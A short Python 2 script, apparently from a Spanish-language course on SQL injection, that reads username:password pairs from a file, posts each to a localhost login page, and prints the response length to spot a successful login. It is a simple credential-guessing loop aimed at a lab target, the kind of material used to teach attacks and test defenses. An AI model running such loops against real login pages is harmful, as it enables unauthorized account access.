import urllib2, urllib

link = "http://localhost/CursoPython/SQLInjection/login.php"

archivo = "usuarios.txt"
lineas = open(archivo, "r")

for linea in lineas:
    linea       = linea.split(':')
    usuario     = str(linea[0]).strip()
    clave       = str(linea[1]).strip()
    parametros  = urllib.urlencode( {"clave":str(clave), "usuario":str(usuario), "boton":"Ingresar"} )
    print parametros
    pagina      = urllib2.urlopen(link, parametros).read()
    #print pagina
    print "[*] Intentando con --%s:%s-- " % (usuario , clave)
    print "[*] %d " % ( len(pagina) )
    print
